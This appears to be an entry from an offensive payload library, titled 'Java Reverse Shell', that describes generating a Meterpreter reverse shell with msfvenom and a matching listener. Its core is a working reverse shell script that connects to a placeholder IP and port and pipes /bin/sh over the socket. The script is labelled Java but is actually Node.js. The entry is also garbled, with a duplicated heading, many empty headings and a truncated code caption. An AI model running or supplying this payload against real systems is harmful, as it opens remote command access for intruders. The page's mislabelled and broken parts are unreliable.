---
id: 947d418e-ba20-43d1-a04e-65a55ec885eb
name: Java Reverse Shell
type: payload
verified: true
created_at: '2019-09-17T17:35:37.481337+00:00'
updated_at: '2023-05-30T20:05:25.614516+00:00'
---

# Java Reverse Shell

**Status**: ✓ Verified

 Generate a Java reverse shell payload with MSFVenom. Creating a Meterpreter listener with a one liner. Payload 

## Description

## Description

Generate a Java reverse shell payload with MSFVenom.

Creating a Meterpreter listener with a one liner.



## Payload



**Command**: [[msfvenom JAVA Meterpreter reverse shell]]





## Code Payload



**Code** ([[(function(){
    var net = require("net"),
       ]]):

```java
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket(); client.connect($_TARGET_PORT, "$_TARGET_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```





## Listener



**Command**: [[msfconsole Java Meterpreter Listener]]





## 

## 

## 

## 

## 

## 

## 

## 

## 

## 

## 

## 


